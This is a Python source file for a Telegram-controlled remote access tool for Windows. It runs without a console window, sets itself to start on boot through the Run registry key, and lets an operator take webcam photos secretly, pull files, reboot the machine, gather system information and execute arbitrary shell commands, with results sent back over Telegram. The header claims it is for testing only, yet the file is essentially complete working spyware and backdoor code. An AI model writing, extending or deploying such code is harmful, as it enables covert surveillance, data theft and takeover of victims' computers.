"""
Telegram Remote Control Bot using Telethon
For testing and demonstration purposes only

Usage: pythonw bot.py <API_ID> <API_HASH> <BOT_TOKEN> <AUTHORIZED_USER_ID>
(Use pythonw for hidden execution without console window)
"""

import os
import subprocess
import tempfile
import time
import sys
from datetime import datetime
from telethon import TelegramClient, events
import cv2
import winreg

# ============================================
# CONFIGURATION - From command line arguments
# ============================================
if len(sys.argv) != 5:
    print("Usage: pythonw bot.py <API_ID> <API_HASH> <BOT_TOKEN> <AUTHORIZED_USER_ID>")
    print("\nExample:")
    print('pythonw bot.py 12345678 "abc123def456" "123456:ABCdefGHIjkl" 987654321')
    print("\nNote: Use pythonw (not python/python3) for hidden execution without console")
    sys.exit(1)

API_ID = sys.argv[1]
API_HASH = sys.argv[2]
BOT_TOKEN = sys.argv[3]
AUTHORIZED_USER_ID = int(sys.argv[4])

# Persistence settings
REGISTRY_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
APP_NAME = "TelegramSystemBot"

# Global variable to store persistence setup status
persistence_setup_status = {"enabled": False, "error": None}

# ============================================
# Initialize the bot
# ============================================
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

def is_authorized(user_id):
    """Check if user is authorized to use the bot"""
    return user_id == AUTHORIZED_USER_ID

def setup_persistence():
    """Setup auto-run on system boot via Windows Registry"""
    global persistence_setup_status
    
    try:
        # Get the full path to the current script
        if getattr(sys, 'frozen', False):
            # Running as compiled executable
            script_path = sys.executable
        else:
            # Running as Python script - use pythonw.exe directly for hidden execution
            script_path = os.path.abspath(sys.argv[0])
            
            # Get python directory and use pythonw.exe
            python_dir = os.path.dirname(sys.executable)
            pythonw_path = os.path.join(python_dir, 'pythonw.exe')
            
            # Verify pythonw exists
            if os.path.exists(pythonw_path):
                print(f"✅ Using pythonw for hidden execution: {pythonw_path}")
            else:
                print(f"⚠️  pythonw.exe not found in: {python_dir}")
                pythonw_path = sys.executable
            
            # Build command with arguments
            script_path = f'"{pythonw_path}" "{script_path}" {API_ID} {API_HASH} {BOT_TOKEN} {AUTHORIZED_USER_ID}'
        
        # Open registry key
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY,
            0,
            winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
        )
        
        # Check if already exists
        try:
            existing_value, _ = winreg.QueryValueEx(key, APP_NAME)
            # Check if it points to the same script
            if script_path in existing_value or existing_value in script_path:
                print(f"✅ Persistence already configured: {APP_NAME}")
                winreg.CloseKey(key)
                persistence_setup_status = {"enabled": True, "error": None}
                return True
        except FileNotFoundError:
            pass  # Entry doesn't exist, will create it
        
        # Set the registry value
        winreg.SetValueEx(
            key,
            APP_NAME,
            0,
            winreg.REG_SZ,
            script_path
        )
        winreg.CloseKey(key)
        
        print(f"✅ Persistence configured: {APP_NAME}")
        print(f"📍 Registry: HKCU\\{REGISTRY_KEY}\\{APP_NAME}")
        persistence_setup_status = {"enabled": True, "error": None}
        return True
        
    except Exception as e:
        print(f"⚠️  Failed to setup persistence: {e}")
        persistence_setup_status = {"enabled": False, "error": str(e)}
        return False

def check_persistence():
    """Check if persistence is currently enabled"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY,
            0,
            winreg.KEY_QUERY_VALUE
        )
        value, _ = winreg.QueryValueEx(key, APP_NAME)
        winreg.CloseKey(key)
        return True
    except:
        return False

# ============================================
# /start command
# ============================================
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    if not is_authorized(event.sender_id):
        await event.reply("⛔ Unauthorized access attempt logged.")
        return
    
    # Get persistence status
    is_enabled = check_persistence()
    if is_enabled:
        persistence_msg = "✅ Enabled"
    else:
        if persistence_setup_status["error"]:
            persistence_msg = f"❌ Failed - {persistence_setup_status['error']}"
        else:
            persistence_msg = "❌ Not configured"
    
    help_text = f"""
🤖 **Remote Control Bot - Active**

**Available Commands:**
/screenshot - Take a photo using laptop camera
/get_file <filename> - Download a file from bot directory
/reboot - Restart the system
/systeminfo - Get system information
/cmd <command> - Execute CMD command

**Status:**
🔄 Auto-Start on Boot: {persistence_msg}
"""
    await event.reply(help_text)

# ============================================
# /screenshot command
# ============================================
@bot.on(events.NewMessage(pattern='/screenshot'))
async def screenshot_handler(event):
    if not is_authorized(event.sender_id):
        await event.reply("⛔ Unauthorized")
        return
    
    await event.reply("📸 Accessing camera...")
    
    try:
        # Initialize camera
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            await event.reply("❌ Cannot access camera")
            return
        
        # Wait for camera to warm up (prevents white/overexposed images)
        await event.reply("⏳ Warming up camera (3 seconds)...")
        time.sleep(3)
        
        # Capture a few frames to let camera adjust
        for _ in range(5):
            cap.read()
            time.sleep(0.1)
        
        # Capture the actual image
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            await event.reply("❌ Failed to capture image")
            return
        
        # Save to temp file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        temp_path = os.path.join(tempfile.gettempdir(), f'screenshot_{timestamp}.jpg')
        cv2.imwrite(temp_path, frame)
        
        # Send the image
        await event.reply("✅ Sending image...")
        await bot.send_file(event.chat_id, temp_path, caption=f"📸 Screenshot taken at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Cleanup
        os.remove(temp_path)
        
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# ============================================
# /get_file command
# ============================================
@bot.on(events.NewMessage(pattern=r'/get_file\s+(.+)'))
async def get_file_handler(event):
    if not is_authorized(event.sender_id):
        await event.reply("⛔ Unauthorized")
        return
    
    filename = event.pattern_match.group(1).strip()
    
    await event.reply(f"🔍 Looking for file: {filename}")
    
    try:
        # Check if file exists in current directory
        if not os.path.exists(filename):
            await event.reply(f"❌ File not found: {filename}")
            return
        
        # Check file size
        file_size = os.path.getsize(filename)
        if file_size > 50 * 1024 * 1024:  # 50MB limit for bot API
            await event.reply(f"❌ File too large: {file_size / (1024*1024):.2f} MB (max 50MB)")
            return
        
        await event.reply(f"📤 Sending file ({file_size / 1024:.2f} KB)...")
        await bot.send_file(event.chat_id, filename, caption=f"📁 {filename}")
        await event.reply("✅ File sent successfully")
        
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# ============================================
# /reboot command
# ============================================
@bot.on(events.NewMessage(pattern='/reboot'))
async def reboot_handler(event):
    if not is_authorized(event.sender_id):
        await event.reply("⛔ Unauthorized")
        return
    
    await event.reply("⚠️ System will reboot in 10 seconds...")
    await event.reply("🔄 Rebooting now...")
    
    try:
        # Windows reboot command with 10 second delay
        subprocess.Popen(['shutdown', '/r', '/t', '10'], shell=True)
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# ============================================
# /systeminfo command
# ============================================
@bot.on(events.NewMessage(pattern='/systeminfo'))
async def systeminfo_handler(event):
    if not is_authorized(event.sender_id):
        await event.reply("⛔ Unauthorized")
        return
    
    await event.reply("🔍 Gathering system information...")
    
    try:
        result = subprocess.run(
            ['systeminfo'],
            capture_output=True,
            text=True,
            timeout=30,
            shell=True
        )
        
        output = result.stdout
        
        # Telegram message limit is 4096 characters
        if len(output) > 4000:
            # Save to file and send as document
            temp_path = os.path.join(tempfile.gettempdir(), 'systeminfo.txt')
            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(output)
            
            await bot.send_file(event.chat_id, temp_path, caption="📊 System Information")
            os.remove(temp_path)
        else:
            await event.reply(f"```\n{output}\n```")
        
    except subprocess.TimeoutExpired:
        await event.reply("❌ Command timed out")
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# ============================================
# /cmd command
# ============================================
@bot.on(events.NewMessage(pattern=r'/cmd\s+(.+)')
async def cmd_handler(event):
    if not is_authorized(event.sender_id):
        await event.reply("⛔ Unauthorized")
        return
    
    command = event.pattern_match.group(1).strip()
    
    await event.reply(f"⚙️ Executing: `{command}`\n⏳ Please wait, collecting output...")
    
    try:
        # Execute command and wait for completion
        # This handles commands like ping that output gradually
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True
        )
        
        # Wait for process to complete (with 120 second timeout)
        try:
            stdout, stderr = process.communicate(timeout=120)
        except subprocess.TimeoutExpired:
            process.kill()
            await event.reply("❌ Command timed out after 120 seconds")
            return
        
        # Combine output
        output = stdout if stdout else stderr
        
        if not output:
            output = f"✅ Command executed successfully (exit code: {process.returncode})"
        
        # Handle long output
        if len(output) > 4000:
            # Save to file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            temp_path = os.path.join(tempfile.gettempdir(), f'cmd_output_{timestamp}.txt')
            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(f"Command: {command}\n")
                f.write(f"Exit Code: {process.returncode}\n")
                f.write("=" * 50 + "\n\n")
                f.write(output)
            
            await bot.send_file(event.chat_id, temp_path, caption=f"📄 Output for: `{command}`")
            os.remove(temp_path)
        else:
            # Send output directly
            await event.reply(f"```\n{output}\n```")
        
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# ============================================
# Start the bot
# ============================================
if __name__ == '__main__':
    print("=" * 60)
    print("🤖 Telegram Remote Control Bot")
    print("=" * 60)
    
    # Setup persistence on first run
    setup_persistence()
    
    print("\n🚀 Bot starting...")
    print("=" * 60 + "\n")
    
    bot.run_until_disconnected()

